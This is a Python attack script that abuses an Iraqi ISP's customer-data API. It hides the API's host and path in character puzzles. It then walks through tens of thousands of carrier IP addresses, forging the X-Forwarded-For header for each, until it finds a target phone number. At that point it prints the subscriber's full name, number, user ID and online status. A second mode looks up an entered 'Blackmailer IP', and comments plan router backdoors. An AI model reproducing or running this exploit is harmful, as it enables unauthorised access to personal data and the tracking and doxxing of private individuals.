import http.client # to deal with http requests & response
import time # for timeout , sleep
import sys, os # to exit when one of the Threads return true
import threading 
import telnetlib #  lvl4 


# searching till mask  100.254.254.254 need to but it on A class so it search on 100.
# This script Wroted  by Mohammed Adil AKA Mr.Hamoud on Winx84_x64 bit
# using Python version 3.5.3
# I made it On Couple of Levels
# level 1 -> Gather ip info [done]
# level 2 -> Gather Mbile info[done 60%]
# level 3 -> Scan The Client System < Gain Access! [working..]
# level 4 -> Inject A Backdoor via Client Rounter [ working ..]
#[*]Gather: SSID.Key
#[*]Gather : People inside Client Home with full Deatailts of them
# Hack The World & ENjoy
# Drink Tea , & Say EeeeeEEEEeeeeee :)
# AL-Hamdulelah For Every & all of Things that He Gave me <3
# I'm 27 years old , lives in IRAQ , love pentesting , programing ..etc
# Live Free Or Die Hard
# Favorit Movies - Hackers , WarGames
# Zone-H :  Mr.Hamoud
# Contact Mail- Boythe_love[at]hotmail[dot]com
# Since 2008 - 2020

def rangip(mobile, local_ip):
    
    earlist =['u','b','Mr.Hamoud is in love With iraq','k','p','x','x','q','i']
    

    # Solve The S1mple Pazzel ^_^
    # 
    
    Mohammed = str(earlist[0]+earlist[1][0]+earlist[2][4]+earlist[4]+earlist[2][26])
    IQ_1 = str(earlist[2][19]+earlist[2][28]+earlist[2][1]+earlist[2][23:25]+earlist[2][16]+earlist[2][26]+earlist[2][14]+earlist[3])
    IQ_Adil = str(earlist[2][2])
    DOM_Q = str(earlist[8]+earlist[7])
    conn = http.client.HTTPSConnection(Mohammed+IQ_Adil+IQ_1+IQ_Adil+DOM_Q)
    #local_ip = [100, 66, 140, 0]
    while (local_ip[3] and local_ip[2]) < 255: # inc 0 of last mask by 1 per try
                
                #print(local_ip)
                local_ip[3]+=1 # inc by 1 
                
                ip_last_sub = str(local_ip[:]) # after is add to 254 last sub of ip = 10.0.0.254  converted to str be like '[100 ,66 , 0, 0]' and save in ip_last 
                ip_last_sub = ip_last_sub.replace('[','') # replace the char [   '[100 ,66 , 0, 0]'
                ip_last_sub = ip_last_sub.replace(']','') # replace the char ]   '100 ,66 , 0, 0]'
                ip_last_sub = ip_last_sub.replace(", ",".") # replace the char (, )   '100 ,66 , 0, 0' result is 100.66.0.2
                if local_ip[3] == 255: # if reach's 245 then reset and inc the sec sub like 100.66.0.254
                    local_ip[3] = 0 # reset 254 to 0
                    local_ip[3] +=1 # inc by 1
                    local_ip[2] +=1 # inc by 1
                    if local_ip[3] and local_ip[2] == 255: # if last subs reach 254.254 then
                        local_ip[3] = 0 # reset 254 to 0
                        local_ip[3] += 1 # inc by 1
                        local_ip[2] = 0 # reset 0
                        local_ip[2] += 1
                    
                        local_ip[1] += 1 # inc sec subnet 100.254.254.254
                    if local_ip[3] and local_ip[2] and local_ip[1] == 255 and local_ip[1] != 66:
                        local_ip[3] = 0 # reset 254 to 0
                        local_ip[3] += 1 # inc by 1
                        local_ip[2] = 0 # reset 0
                        local_ip[2] += 1
                        local_ip[1] = 0
                        local_ip[1] +=1
                        
                
                                       
                
                # here we put our code to try hitting ip's for phone number
                # we may add try :
                
                xxx = str(ip_last_sub)
                ccc = {"Content-type": "application/x-www-form-urlencoded",
                    "X-Forwarded-For": xxx ,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-GB,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Upgrade-Insecure-Requests":" 1" }
                encry =['r','A','a','t','D','U','s','e','G','/','i','p','u','m','2','34','r','H']
                encry1 =['E','n','j','o','y','with','t','h','e','h','a','c','k']
                conn.request("GET", str(encry[9]+encry[2]+encry[11]+encry[10]+encry[9]+encry[12]+encry[6]+encry[7]+encry[0]+encry[9]+encry[8]+encry[7]+encry[3]+encry[5]+encry[6]+encry[7]+encry[0]+encry[4]+encry[2]+encry[3]+encry[2]+encry[1]+encry[0]), body=None ,headers=ccc)
                
                data = conn.getresponse()
                all_data = data.read() #.decode('utf-8')
                data_xml = [str(all_data)]
                
                if data.status == 200:
                    
                    if data.reason == 'OK':
                        
                        
                        if mobile in str(data_xml): # this shoud be out of Try , 3 hours to figerout wtf i did wrong , غلطه بسيطه كلفتني 3 ساعات
                            #here
                            try: # i spent 3 hours try to find whats wrong , then i foud that i forgot to str() the list ~_~ kara behaaa
                                
                                print("Class C\n\r[#]Success:"+"\nMobile IP:"+xxx) #class C 255.255.255.0 netmask FF = 254 device 
                                txt_find = str('<FullName>')
                                txt_mob = str('<MobileNumber>')
                                txt_green = str('<ServiceStatusColor>')
                                txt_uid = str('<UserID>')
                                if  txt_green in data_xml[0]: # search if in list
                                    start_green = int(data_xml[0].find("<ServiceStatusColor>")) # new var to find the txt position in list
                                    start_green += 20 # to reach service clear colour
                                    txt_endgreen = str('</ServiceStatusColor>') # same as about 
                                    if txt_endgreen in data_xml[0]: # if inside if of the same lable of service status xml, to make it ease Habibi ^_^
                                        txt_endgreen1 = int(data_xml[0].find("</ServiceStatusColor>")) # same as above kalbe :)
                                        online_green = str(data_xml[0][start_green:txt_endgreen1]) # show chaging value from <servicolor>  </servcolor>
                                        if 'Green' in online_green:
                                            
                                            
                                            
                                        
                                             frame_1 = '--------------------------'
                                             
                                             IQ_STATUS = '[#]Client_Status :\rOnline\n\r'

                                             for eachframe in frame_1:
                                                 
                                                 print (eachframe, end ='')
                                                 time.sleep(0)
                                             print("\n")
                                             
                                             for words in IQ_STATUS:
                                            
                                                 print(words, end='')
                                                 time.sleep(0.1)
                                             print("\n")    
                                             for eachframe in frame_1:
                                                 print (eachframe, end ='')
                                                 time.sleep(0)
                                            
                                                 
                                             
                                                
                                        elif 'Green' not in online_green:
                                            frame_2 = '--------------------------'
                                            IQ_STATUS2 = '[-]Client_Status :\rOffline\n\r'
                                            for eachframe2 in frame_2:
                                                print (eachframe2, end ='')
                                                time.sleep(0)
                                            print("\n")
                                            for words in IQ_STATUS2:
                                                print(words, end='')
                                                time.sleep(0)
                                            for eachframe2 in frame_2:
                                                print (eachframe2, end ='')
                                                time.sleep(0)
                                            
                                            # print("[-]Client_Status :\rOffline\n\r")

                                if txt_find in data_xml[0]: # kolshe as same as above ya3ne Life it's easy with Python habibi ^_^

                                    fullname = int(data_xml[0].find("<FullName>"))
                                    fullname += 10 # 10 step to len of <fullname> to reach The clear name

                                    end_find = str('</FullName>')
                                    if end_find in data_xml[0]:
                                        end_fullname = int(data_xml[0].find("</FullName>"))
                                        print("\n")
                                        print("[*]Client Name :\r"+(data_xml[0][fullname:end_fullname]+"\n\r"))
                                if txt_mob in data_xml[0]:
                                    start_mob = int(data_xml[0].find("<MobileNumber>"))
                                    start_mob += 14 # to reach clear phone number
                                    txt_endmob = str('</MobileNumber>')
                                    if txt_endmob in data_xml[0]:
                                        txt_endmob1 = int(data_xml[0].find("</MobileNumber>"))
                                        print("[*]Client_Phone:\r"+(data_xml[0][start_mob:txt_endmob1])+"\n\r")

                                if txt_uid in data_xml[0]:
                                    uid_start = int(data_xml[0].find(txt_uid))
                                    uid_start += 8 # to reach uid value
                                    uid_end = str('</UserID>')
                                    if uid_end in data_xml[0]:
                                        uid_end1 = int(data_xml[0].find(uid_end))
                                        print("[*]Client_ID:\r"+(data_xml[0][uid_start:uid_end1])+"\n\r")
                                        
                                
                                
                                os._exit(1) # to exit all Threads          
                                break # to break the loop and stoping it
                                
                                
                                
                                #return # to return & stop execution the code &_&
                            #elif mobile not in data_xml: # local_ip = [100, 66, 116, 0]
                        
                            
                            except: # for try of mobile
                                
                                print("error ~_~")
                            
                                
                    if (data.status != 200): # we shall be on same line of while to execute if not in # GodDamn
                        
                            
                        no_match = '[-]'
                        no_matchmsg = 'check your connection .'
                        
                        for eachchar in no_matchmsg:
                            print(no_match, eachchar, end ='')
                            sys.stdout.flush
                            time.sleep(0.2)

            

def ClientInformation(): 
    
    
    #local_ip = [100, 66, 0, 0]
    line_x0 = '''----------------------------------------------------------------------------------------------'''
    line_x = '''[*]search by Phone : 1\n[*]search by ip : 2\n'''             
    print(line_x0)
    for somechar in line_x:
        
        print(somechar, end='')
        sys.stdout.flush()
        time.sleep(0)
    x_methods = str(input("[#]Search Method/>"))
    
    if x_methods == "1": # search by phone
        global mobile
        save_phone = input("Phone Number/>")
        mobile = str(save_phone)
        if len(save_phone) == 11:
            
            mobile_type = mobile
            list_Zain = ['0780','0781','0782','0790']
            list_Asia = ['0770','0773','0772','0771']
            list_Korek = ['0750','0755','0753','0751']
            Z_S_K = list_Zain + list_Asia + list_Korek # to check if not in side all of them 
            if mobile_type[:4] in list_Asia:
                IQ_Type = 'Asia/Cell'
                              
            if mobile_type[:4] in list_Zain:
                IQ_Type = 'Zain/IQ'
                
            if mobile_type[:4] in list_Korek:
                
                IQ_Type = 'Korek/IQ'
            elif mobile_type[:4] not in Z_S_K:
                IQ_Type = 'Unkown Mobile Number'
            
            waiting = '[*]Mobile'+mobile+'\n\Company:'+IQ_Type+'\n[*]Gathering information\n[#]Please Wait..\n'
            
            
            for eachword in waiting:
                print(str(eachword), end='')
                sys.stdout.flush()
                time.sleep(0)
                
            #here multi-threding code
      
            t1  = threading.Thread(target=rangip, args=(mobile, local_ip))
            t2 = threading.Thread(target=rangip, args=(mobile, local_ip2))
            t1.daemon = True
            t1.start()
            t2.daemon = True
            t2.start()
            t1.join()
            t2.join()
            t3  = threading.Thread(target=rangip, args=(mobile, local_ip3))
            t4 = threading.Thread(target=rangip, args=(mobile, local_ip4))
            t3.daemon = True
            t3.start()
            t4.daemon = True
            t4.start()
            t3.join()
            t4.join()
            t5  = threading.Thread(target=rangip, args=(mobile, local_ip5))
            t6 = threading.Thread(target=rangip, args=(mobile, local_ip6))
            t5.daemon = True
            t5.start()
            t6.daemon = True
            t6.start()
            t5.join()
            t6.join()
            
            
            
            #rangip(mobile, local_ip)
            return
            
            
            
            
                                            
                                
                       
                        
                                                    
                               

                    
                    

                
                
                
                    
                #elif  data.status != 200:
                
                    #print("[*]dead ip")
                 
                #local_ip[3] +=1 # to inc last mask by 1 
                #print(ip_last_sub)
                                
        else:
                
            print("mobile number should include 0770,0780,0790,0750,0730...")
            return
                
    
    
          
        
        
    if x_methods == "2": # search by ip
    
        try:
            class search_ip:
                
                x = (input("Blackmailer IP:"))
                
            
            
                ccc = {"Content-type": "application/x-www-form-urlencoded",
                                "X-Forwarded-For": x ,
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "Accept-Language": "en-GB,en;q=0.5",
                                "Accept-Encoding": "gzip, deflate",
                                "Upgrade-Insecure-Requests":" 1" }

                encry =['r','A','a','t','D','U','s','e','G','/','i','p','u','m','2','34','r','H']
                encry1 =['E','n','j','o','y','with','t','h','e','h','a','c','k']
                
                        
                
                conn.request("GET", str(encry[9]+encry[2]+encry[11]+encry[10]+encry[9]+encry[12]+encry[6]+encry[7]+encry[0]+encry[9]+encry[8]+encry[7]+encry[3]+encry[5]+encry[6]+encry[7]+encry[0]+encry[4]+encry[2]+encry[3]+encry[2]+encry[1]+encry[0]), body=None ,headers=ccc)
                



                data = conn.getresponse()

                if data.status == 200:
                    
                    # print("Success:\r\n"+str("[*]Getting Client Informations \n"))
                    
                    if len(x) == 0 | len(x) < 7:
                        x_empty = "[-]Please Write a Valid ip adress\n"
                        for wordsinline in x_empty:
                            print(wordsinline, end='')
                            time.sleep(0)
                    
                        
                      
                    
                    
                           
                    

                    
                    

                    Client_info = data.readline().decode('utf-8')
                    Client_list = [str(Client_info)] # put decoded respone data in a list to search 

                    txt_find = str('<FullName>')
                    txt_mob = str('<MobileNumber>')
                    txt_green = str('<ServiceStatusColor>')
                    txt_uid = str('<UserID>')

                    if  txt_green in Client_list[0]: # search if in list
                        start_green = int(Client_list[0].find("<ServiceStatusColor>")) # new var to find the txt position in list
                        start_green += 20 # to reach service clear colour
                        txt_endgreen = str('</ServiceStatusColor>') # same as about 
                        if txt_endgreen in Client_list[0]: # if inside if of the same lable of service status xml, to make it ease Habibi ^_^
                            txt_endgreen1 = int(Client_list[0].find("</ServiceStatusColor>")) # same as above kalbe :)
                            online_green = str(Client_list[0][start_green:txt_endgreen1]) # show chaging value from <servicolor>  </servcolor>
                            if 'Green' in online_green:
                                
                                
                                
                            
                                 frame_1 = '--------------------------'
                                 
                                 IQ_STATUS = '[#]Client_Status :\rOnline\n\r'
              
                                 for eachframe in frame_1:
                                     
                                     print (eachframe, end ='')
                                     time.sleep(0)
                                 print("\n")
                                 
                                 for words in IQ_STATUS:
                                
                                     print(words, end='')
                                     time.sleep(0.1)
                                 print("\n")    
                                 for eachframe in frame_1:
                                     print (eachframe, end ='')
                                     time.sleep(0)
                                
                                     
                                 
                                    
                            elif 'Green' not in online_green:
                                frame_2 = '--------------------------'
                                IQ_STATUS2 = '[-]Client_Status :\rOffline\n\r'
                                for eachframe2 in frame_2:
                                    print (eachframe2, end ='')
                                    time.sleep(0)
                                print("\n")
                                for words in IQ_STATUS2:
                                    print(words, end='')
                                    time.sleep(0)
                                for eachframe2 in frame_2:
                                    print (eachframe2, end ='')
                                    time.sleep(0)
                                
                                # print("[-]Client_Status :\rOffline\n\r")

                    if txt_find in Client_list[0]: # kolshe as same as above ya3ne Life it's easy with Python habibi ^_^

                        fullname = int(Client_list[0].find("<FullName>"))
                        fullname += 10 # 10 step to len of <fullname> to reach The clear name

                        end_find = str('</FullName>')
                        if end_find in Client_list[0]:
                            end_fullname = int(Client_list[0].find("</FullName>"))
                            print("\n")
                            print("[*]Client Name :\r"+(Client_list[0][fullname:end_fullname]+"\n\r"))
                    if txt_mob in Client_list[0]:
                        start_mob = int(Client_list[0].find("<MobileNumber>"))
                        start_mob += 14 # to reach clear phone number
                        txt_endmob = str('</MobileNumber>')
                        if txt_endmob in Client_list[0]:
                            txt_endmob1 = int(Client_list[0].find("</MobileNumber>"))
                            print("[*]Client_Phone:\r"+(Client_list[0][start_mob:txt_endmob1])+"\n\r")

                    if txt_uid in Client_list[0]:
                        uid_start = int(Client_list[0].find(txt_uid))
                        uid_start += 8 # to reach uid value
                        uid_end = str('</UserID>')
                        if uid_end in Client_list[0]:
                            uid_end1 = int(Client_list[0].find(uid_end))
                            print("[*]Client_ID:\r"+(Client_list[0][uid_start:uid_end1])+"\n\r")
                elif  data.status != 200:
                    print("[*]Check Your Connection ..retrying ....")
                    ClientInformation()









                conn.close()
        except:
            print("a")



def MrHamoud_index(): # My Flag , <3 Alah Akbar
    Mohammed_iraq = '''

                              
                          ==========================================================================================================
                        | ----------------------------------------------------------------------------------------------------------|
                        | ----------------------------------------------------------------------------------------------------------|
                        | ----------------------------------------------------------------------------------------------------------|
                         ==========================================================================================================

                                                                 /----------\                                                   #####
                                                               /    ########                                                 
                                                              /     /--------|             -----  -- \       \ ||  /            ____                    
                                                             /    /     |  |              /----- \  |          --        |  |   |  |                  
                                                            | |         |  |            /        |  |         |  |       |  |   |  |                  
                                                            |  \|       |  |           |######## |  /         |  |       |  |   |  |
                                                            |  \ |      |  |           |---     |  /          |  |       |  |   |  |                  
                                        ___         ___       \ |  |    |  |           ----    |  /           |  |       |  |   |  |
                                        |  |        | |       \ | /     |  |                   | |            |  |       |  |   |  |                  
                                        |  |        | |       / | \     |  |                   | |            |  |       |  |   |  |              
                                        |  |        | |      / /  |     |  |                   | |            |  |       |  |   |  |                  
                                        |  |        | |     /  /  |     |  |                   | |            |  |       |  |   |  |                      
                                        |  /        | |      \    |     |  |                   | |            |  |       |  |   |  |
                                        /  ---------   --------\  |\    |  |                   | |            |  |       |  |   |  |                  
                                       /                          | \   |  |                   \ \ \----------|  |____ _ |  |   |  |                      
                                      / //---------------------------                           \ \ _______________________ _/  |  |                      
                                     /  /      [#]                                              \----------------------------/
                                    /  /    
                                  _/  /
                                 |   /
                                 |__/   
                                        
                          ==========================================================================================================
                        | ----------------------------------------------------------------------------------------------------------|
                        | ----------------------------------------------------------------------------------------------------------|
                        | ----------------------------------------------------------------------------------------------------------|
                         ==========================================================================================================




'''
    # print(Mohammed_iraq)
    line_1 = '''---------------------------------------------------------------------------------------------
                                                        Hack The Planet                                     
                                           Scripted By [Mr.Hamoud] For Legal usage                         
                                          Contact_me : Boythe_love[at]hotmail[dot]com
                                          
-----------------------------------------------------------------------------------------------\n\r'''

    for charinline in line_1:
        print(charinline, end ='')
        sys.stdout.flush()
        time.sleep(0)


        
    


    
def main(): # The main which include what we wrote above
    MrHamoud_index()
    global local_ip
    global local_ip2
    global local_ip3
    global local_ip4
    global local_ip5
    global local_ip6
    global local_ip7
    global local_ip8
    global local_ip9
    global local_ip10
    global local_ip11
    global local_ip12
    global local_ip13
    global local_ip14
    global local_ip15
    global local_ip16
    global local_ip17
    global local_ip18
    global local_ip19
    global local_ip20
    global local_ip21
    global local_ip22
    global local_ip23
    global local_ip24
    global local_ip25
    global local_ip26
    global local_ip27
    global local_ip28
    global local_ip29
    global local_ip30
    global local_ip31
    global local_ip32
    global local_ip33
    global local_ip34
    global local_ip35
    global local_ip36
    global local_ip37
    global local_ip38
    global local_ip39
    global local_ip40
    global local_ip41
    global local_ip42
    global local_ip43
    global local_ip44
    global local_ip45
    global local_ip46
    global local_ip47
    global local_ip48
    global local_ip49
    global local_ip50
    global local_ip51
    global local_ip52
    global local_ip53
    global local_ip54
    global local_ip55
    global local_ip56
    global local_ip57
    global local_ip58
    global local_ip59
    global local_ip60
    global local_ip61
    global local_ip62
    global local_ip63
    global local_ip64
    global local_ip65
    global local_ip66
    global local_ip67
    global local_ip68
    global local_ip69
    global local_ip70
    global local_ip71
    global local_ip72
    global local_ip73
    global local_ip74
    global local_ip75
    global local_ip76
    global local_ip77
    global local_ip78
    global local_ip79
    global local_ip80
    global local_ip81
    global local_ip82
    global local_ip83
    global local_ip84
    global local_ip85
    global local_ip86
    global local_ip87

    
    local_ip = [100, 1, 0, 0]
    local_ip2 = [100, 2, 0, 0]
    local_ip3 = [100, 3, 0, 0]
    local_ip4 = [100, 4, 0, 0]
    local_ip5 = [100, 5, 0, 0]
    local_ip6 = [100, 6, 0, 0]
    local_ip7 = [100, 7, 0, 0]
    local_ip8 = [100, 8, 0, 0]
    local_ip9 = [100, 9, 0, 0]
    local_ip10 = [100, 10, 0, 0]
    local_ip11 = [100, 11, 0, 0]
    local_ip12 = [100, 12, 0, 0]
    local_ip13 = [100, 13, 0, 0]
    local_ip14 = [100, 14, 0, 0]
    local_ip15 = [100, 15, 0, 0]
    local_ip16 = [100, 16, 0, 0]
    local_ip17 = [100, 17, 0, 0]
    local_ip18 = [100, 18, 0, 0]
    local_ip19 = [100, 19, 0, 0]
    local_ip20 = [100, 20, 0, 0]
    local_ip21 = [100, 21, 0, 0]
    local_ip22 = [100, 22, 0, 0]
    local_ip23 = [100, 23, 0, 0]
    local_ip24 = [100, 24, 0, 0]
    local_ip25 = [100, 25, 0, 0]
    local_ip26 = [100, 26, 0, 0]
    local_ip27 = [100, 27, 0, 0]
    local_ip28 = [100, 28, 0, 0]
    local_ip29 = [100, 29, 0, 0]
    local_ip30 = [100, 30, 0, 0]
    local_ip31 = [100, 31, 0, 0]
    local_ip32 = [100, 32, 0, 0]
    local_ip33 = [100, 33, 0, 0]
    local_ip34 = [100, 34, 0, 0]
    local_ip35 = [100, 35, 0, 0]
    local_ip36 = [100, 36, 0, 0]
    local_ip37 = [100, 37, 0, 0]
    local_ip38 = [100, 38, 0, 0]
    local_ip39 = [100, 39, 0, 0]
    local_ip40 = [100, 40, 0, 0]
    local_ip41 = [100, 41, 0, 0]
    local_ip42 = [100, 42, 0, 0]
    local_ip43 = [100, 43, 0, 0]
    local_ip44 = [100, 44, 0, 0]
    local_ip45 = [100, 45, 0, 0]
    local_ip46 = [100, 46, 0, 0]
    local_ip47 = [100, 47, 0, 0]
    local_ip48 = [100, 48, 0, 0]
    local_ip49 = [100, 49, 0, 0]
    local_ip50 = [100, 50, 0, 0]
    local_ip51 = [100, 51, 0, 0]
    local_ip52 = [100, 52, 0, 0]
    local_ip53 = [100, 53, 0, 0]
    local_ip54 = [100, 54, 0, 0]
    local_ip55 = [100, 55, 0, 0]
    local_ip56 = [100, 56, 0, 0]
    local_ip57 = [100, 57, 0, 0]
    local_ip58 = [100, 58, 0, 0]
    local_ip59 = [100, 59, 0, 0]
    local_ip60 = [100, 60, 0, 0]
    local_ip61 = [100, 61, 0, 0]
    local_ip62 = [100, 62, 0, 0]
    local_ip63 = [100, 63, 0, 0]
    local_ip64 = [100, 64, 0, 0]
    local_ip65 = [100, 65, 0, 0]
    local_ip66 = [100, 66, 0, 0]
    local_ip67 = [100, 67, 0, 0]
    local_ip68 = [100, 68, 0, 0]
    local_ip69 = [100, 69, 0, 0]
    local_ip70 = [100, 70, 0, 0]
    local_ip71 = [100, 71, 0, 0]
    local_ip72 = [100, 72, 0, 0]
    local_ip73 = [100, 73, 0, 0]
    local_ip74 = [100, 74, 0, 0]
    local_ip75 = [100, 75, 0, 0]
    local_ip76 = [100, 76, 0, 0]
    local_ip77 = [100, 77, 0, 0]
    local_ip78 = [100, 78, 0, 0]
    local_ip79 = [100, 79, 0, 0]
    local_ip80 = [100, 80, 0, 0]
    local_ip81 = [100, 81, 0, 0]
    local_ip82 = [100, 82, 0, 0]
    local_ip83 = [100, 83, 0, 0]
    local_ip84 = [100, 84, 0, 0]
    local_ip85 = [100, 85, 0, 0]
    local_ip86 = [100, 86, 0, 0]
    local_ip87 = [100, 87, 0, 0]
    
    
    #while True: # this is to make my script keep runnnig habibi like a 24/7 :)

    #ClientInformation() # the function which has our Magic Stick #:)
    while True:
  
        ClientInformation()



if __name__ == '__main__': # defualt for python to make the main function run 
    main()

    
